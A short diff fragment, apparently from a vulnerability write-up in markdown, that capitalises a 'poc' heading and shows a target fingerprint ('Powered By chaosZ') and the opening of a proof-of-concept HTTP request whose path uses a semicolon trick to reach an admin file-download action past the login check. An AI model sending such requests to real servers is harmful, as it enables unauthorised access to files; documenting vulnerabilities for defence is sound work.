@@ -7,7 +7,7 @@
 title="Powered By chaosZ"
 ```
 
-## poc
+## POC
 ```javascript
 POST /admin/file!download.action;admin!login.action HTTP/1.1
 Host: 
